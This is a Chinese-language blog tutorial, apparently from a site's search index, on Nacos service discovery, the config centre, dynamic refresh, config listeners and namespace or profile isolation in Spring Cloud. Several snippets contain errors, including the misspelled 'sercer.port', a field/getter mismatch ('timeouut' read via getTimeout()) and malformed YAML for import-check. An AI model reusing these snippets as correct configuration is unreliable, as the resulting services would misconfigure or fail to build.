private product getProductFromRemote2(Long productId) { // 1. 获取商品服务所在的 IP 地址 // 2. 构造请求 URL，product-service微服务的IP地址 String url = \u0026#34;http://product-service/product/\u0026#34; + productId; // 3. 发送请求，获取商品信息 log.info(\u0026#34;请求URL: {}\u0026#34;, url); product product = restTemplate.getForObject(url, product.class); return product; } **面试题：**注册中心Nacos如果宕机，那么还能成功完成远程调用吗？\n1.注册中心如果宕机，以前调用过那么可以从示例缓存中获取IP地址，还能成功完成远程调用\n2.注册中心宕机，如果以前没调用过，那么第一次需要在注册中心获取地址，不能完成远程调用\nNacos配置中心 动态刷新 1 @Value(\u0026#34;${xxx}\u0026#34;)获取配置+@RefreshScope实现自动刷新 项目中使用方法：\n1.启动Nacos\n2.导入Nacos作为配置中心的依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-config\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 3.在配置文件properties编写配置\n1 2 3 4 spring.application.name=service-order sercer.port=8000 spring.cloud.nacos.server-addr=127.0.0.1:8848 spring.config.import=nacos:service-order.properties //指定导入的配置文件 4.在创建data-id数据集\n要使用这些配置文件，可以使用Value注解加载\n1 2 3 4 5 6 7 8 9 10 11 @Value(\u0026#34;${order.timeout}\u0026#34;) String orderTimeouut; @Value(\u0026#34;${order.auto-confirm}\u0026#34;) String orderConfirm; @GetMapping(\u0026#34;/config\u0026#34;) String config(){ System.out.println(\u0026#34;orderTimeouut:\u0026#34;+orderTimeouut); System.out.println(\u0026#34;orderConfirm:\u0026#34;+orderConfirm); return orderTimeouut+\u0026#34; \u0026#34;+orderConfirm; } 此时如果直接修改Nacos配置文件的值，这个配置文件是不会自动刷新的，如果想要开启自动刷新的话，需要使用注解在类上添加\n1 @RefreshScope //开启配置文件自动刷新注解 一旦项目导入了Nacos的配置中心，那么项目启动前配置文件必须导入Nacos的配置，如果没有导入那么项目会启动报错\n1 2 3 4 两种解决方法 1.禁用Nacos的导入检查 spring.cloud.nacos.config.import-check.enabled=false 2.设置Nacos的导入为可选的，不是必须的 无感知自动刷新 创建一个properties配置类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.example.properties; import lombok.Data; import org.springframework.beans.factory.annotation.Value; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.context.annotation.Bean; import org.springframework.stereotype.Component; @Data @Component @ConfigurationProperties(prefix = \u0026#34;order\u0026#34;) public class OrderProperties { String timeouut; String autoconfirm; } 想要使用配置文件直接依赖注入即可\n1 2 3 4 5 6 7 8 9 10 @Autowired OrderProperties orderProperties; @GetMapping(\u0026#34;/config\u0026#34;) String config(){ System.out.println(\u0026#34;orderTimeouut:\u0026#34;+orderProperties.getTimeout()); System.out.println(\u0026#34;orderConfirm:\u0026#34;+orderProperties.getAutoconfirm()); return orderProperties.getTimeout()+\u0026#34; \u0026#34;+orderProperties.getAutoconfirm(); } 配置监听 先说一个场景：当Nacos的配置文件发生变更时发送邮件给开发者\n项目启动时监听Nacos配置文件变化 1. 获取最新的配置数据 2. 发送邮件通知开发者 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package com.example; import com.alibaba.cloud.nacos.NacosConfigManager; import com.alibaba.nacos.api.config.listener.Listener; import com.alibaba.nacos.client.config.NacosConfigService; import org.springframework.boot.ApplicationArguments; import org.springframework.boot.ApplicationRunner; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; import org.springframework.context.annotation.Bean; import java.util.concurrent.Executor; @EnableDiscoveryClient @SpringBootApplication public class OrderApplication { public static void main(String[] args) { SpringApplication.run(OrderApplication.class, args); } /** * 项目启动时监听Nacos配置文件变化 * 1. 获取最新的配置数据 * 2. 发送邮件通知开发者 */ @Bean public ApplicationRunner runner(NacosConfigManager nacosConfigManager) { return args -\u0026gt; { NacosConfigService nacosConfigService = (NacosConfigService) nacosConfigManager.getConfigService(); nacosConfigService.addListener( \u0026#34;com.example.OrderProperties\u0026#34;, \u0026#34;defaultGroup\u0026#34;, new Listener() { @Override public Executor getExecutor() { return Runnable::run; // 修正：原代码中的Executor.newFixedThreadPool(4)不正确 } @Override public void receiveConfigInfo(String configInfo) { System.out.println(\u0026#34;配置文件更新了，最新的配置信息为：\u0026#34; + configInfo); // 发送邮件通知开发者 // 此处省略发送邮件的代码 System.out.println(\u0026#34;邮件已发送\u0026#34;); } } ); }; } } 思考：如果Nacos的配置文件数据集和项目中的配置文件有相同项，哪个会生效？\n先导入优先，外部优先，所以Nacos的配置文件会优先生效\n1 2 3 4 5 6 spring.application.name=service-order sercer.port=8000 spring.cloud.nacos.server-addr=127.0.0.1:8848 spring.config.import=nacos:service-order.properties,nacos:common.properties //service-order.properties优先级最高common.properties第二高 spring.cloud.nacos.config.import-check.enabled=false 数据隔离 先说场景：假设现在有这么一个需求：项目有多套环境：开发，测试，生产环境，而每一个环境在每套环境下配置文件都不一样\n难点：区分多套环境，区分多种配置，区分多种微服务该怎么解决\n解决方法：\n使用Namespace名称空间区分多套环境，使用Group分组区分多种微服务，使用Data-id数据集区分多种配置\n如何实现呢？？？\n1.在Nacos的命名空间中新建名称空间\n2.创建好开发测试生产环境的命名空间后，在配置管理者找到对应空间，新增配置\n3.动态切换环境\n在微服务的配置文件中定义命名空间和组名，但是这样子不能实现动态切换环境\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 sercer: port: 8000 spring: application: name: service-order cloud: nacos: server-addr: 127.0.0.1:8848 import-check: enabled=false: config: namespace: dev config: import: - nacos:Common.properties?group=order - nacos:database.properties?group=order 完整的配置文件如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 sercer: port: 8000 spring: profiles: active: dev //选择dev环境的配置文件 //active：test //选择test环境下的配置文件 application: name: service-order cloud: nacos: server-addr: 127.0.0.1:8848 import-check: enabled=false: config: namespace: ${spring.profiles.active:public} --- //三个杠表示多文档模式 spring: config: import: - nacos:Common.properties?group=order - nacos:database.properties?group=order activate: on-profile: dev --- spring: config: import: - nacos:Common.properties?group=order - nacos:database.properties?group=order - nacos:redis.properties?group=order activate: on-profile: test --- spring: config: import: - nacos:Common.properties?group=order - nacos:database.properties?group=order - nacos:haha.properties?group=order activate: on-profile: prod ","date":"2025-06-08T11:24:22+08:00","image":"https://lserein.github.io/p/nacos/Nacos_hu_5436af82e36fa2df.jpg","permalink":"https://lserein.github.io/p/nacos/","title":"Nacos"}]